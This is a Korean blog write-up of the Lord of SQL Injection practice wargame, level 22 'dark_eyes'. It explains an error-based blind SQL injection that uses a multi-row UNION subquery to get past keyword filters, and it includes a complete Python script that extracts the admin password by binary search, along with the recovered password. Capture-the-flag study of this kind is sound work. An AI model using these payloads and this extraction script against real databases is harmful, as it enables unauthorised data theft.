---
title: LOS - 22번 dark_eyes
category: Lord of SQL Injection
---

# [22] dark_eyes

## 문제
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FQZVKB%2FbtrnR2UVQMP%2FtzRVYHPoeR2N10uYesKs8k%2Fimg.png">

## 풀이

이번 문제에서는 col, if, case, when, sleep, benchmark를 필터링하고 있다.

<br>

전체적인 구조는 이전 문제와 크게 다르지 않은 Error Based Blind SQLi 문제이다.

* 이전 문제와는 달리 에러가 발생할 시 에러 메시지를 보여주지는 않지만 exit됨으로 인해 빈 화면이 출력되므로 그 자체로 에러 여부 판별이 가능하다.

<br>

이번 문제의 핵심은 if문이나 case문을 사용하지 않고 특정 조건을 충족하는 경우에 에러를 발생시켜주는 것에 있다.

<br>

이래저래 대체할 방법을 찾아봤지만... 방법은 딱 하나인 것 같았다.

**서브쿼리**를 이용하는 것이다.

<br>

사용할 페이로드의 예시는 다음과 같다.

```python
param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id='admin' and length(pw)={num}) %23"
```

① **SELECT 1 UNION SELECT 2**

- 서브쿼리가 둘 이상의 row를 반환하지 못한다는 특성을 이용하여, 해당 요소가 실행될 시 에러가 발생하게끔 유도한다.

② **where id='admin' and length(pw)={num}**

- pw의 길이가 일치할 시 where절이 True가 되므로 ①번 요소가 실행되고, 그로 인한 에러가 발생하게 된다.

- 에러의 발생 유무를 판별하여 pw의 길이와 일치하는 num을 찾아낼 수 있다.

<br>

이후 완전한 pw를 찾는 방법도 동일한 로직을 사용한다.

또한 이전 문제들과 마찬가지로, 2진 탐색을 적용하여 검색 속도를 높인다.

 
<br>
 

**LoS 22번 Python 자동화 코드**이다.

```python
import requests

def send(param):
    url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
    cookie = "dfksep8hnmequ6sm0qe1iu65pa"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("💘 LoS 21을 시작합니다")

for num in range(0,100):
    param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id='admin' and length(pw)={num}) %23"
    if("query" not in send(param)):
        print(f"👏 pw의 길이는 {num}입니다!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id=\"admin\" and ascii(substr(pw,{len},1))>={middle}) %23"
        if("query" not in send(param)):
            param=f"?pw=' || (SELECT 1 UNION SELECT 2 where id=\"admin\" and ascii(substr(pw,{len},1))={middle}) %23"
            if("query" not in send(param)):
                print(f"{len}번째 문자 → {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"👏 pw의 정체는 [{ans}]입니다!")
```

<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FcDNwU8%2FbtrnLHEJjIe%2FQayaMUVXj93KSZTUwujn3K%2Fimg.png">


Blind 공격 결과, pw는 `5a2f5d3c` 임을 확인할 수 있다.

## 결과
<img src="https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=https%3A%2F%2Fblog.kakaocdn.net%2Fdn%2FobIoV%2FbtrnN22UR9z%2FWb6jsJDojQmhcK1tCizpUk%2Fimg.png">